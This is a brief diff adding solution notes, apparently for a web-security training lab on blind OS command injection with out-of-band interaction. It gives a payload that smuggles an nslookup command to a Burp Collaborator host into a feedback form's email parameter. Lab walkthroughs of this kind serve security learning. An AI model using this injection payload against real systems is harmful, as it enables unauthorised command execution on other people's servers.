@@ -1,0 +1,4 @@
+4 Blind OS command injection with out-of-band interaction
+
+Use Burp Suite to intercept and modify the request that submits feedback.
+Modify the email parameter, changing it to: email=x||nslookup+x.burpcollaborator.net||
